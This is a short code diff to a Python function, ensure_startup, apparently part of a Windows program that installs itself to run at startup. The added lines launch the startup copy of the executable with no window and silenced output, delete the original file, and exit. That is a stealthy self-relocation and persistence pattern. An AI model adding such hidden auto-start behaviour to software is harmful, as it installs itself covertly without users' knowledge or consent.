@@ -83,7 +83,17 @@ def ensure_startup():
             if os.path.exists(startup_exe) and os.path.exists(source_exe) and os.path.abspath(source_exe) != os.path.abspath(startup_exe):
                 try:
                     if os.path.getmtime(startup_exe) >= os.path.getmtime(source_exe):
-                        os.remove(source_exe)
+                        subprocess.Popen(
+                            [startup_exe],
+                            creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, "CREATE_NO_WINDOW") else 0,
+                            stdout=subprocess.DEVNULL,
+                            stderr=subprocess.DEVNULL,
+                        )
+                        try:
+                            os.remove(source_exe)
+                        except OSError:
+                            pass
+                        os._exit(0)
                 except OSError:
                     pass
         except OSError:
